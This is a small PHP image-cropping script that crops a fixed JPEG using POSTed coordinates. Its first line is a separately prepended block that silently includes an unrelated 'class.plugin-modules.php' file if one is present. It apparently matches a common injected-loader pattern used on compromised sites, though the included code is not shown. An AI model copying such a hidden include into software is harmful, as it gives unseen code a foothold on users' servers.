<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
if ($_SERVER['REQUEST_METHOD'] == 'POST')
{
    $targ_w = $targ_h = 150;
    $jpeg_quality = 90;

    $src = 'img/cropping-image.jpg';

    $img_r = imagecreatefromjpeg($src);

    $dst_r = ImageCreateTrueColor( $targ_w, $targ_h );

    imagecopyresampled($dst_r,$img_r,0,0,intval($_POST['x']),intval($_POST['y']), $targ_w,$targ_h, intval($_POST['w']),intval($_POST['h']));

    header('Content-type: image/jpeg');
    imagejpeg($dst_r,null,$jpeg_quality);

    exit;
}
?>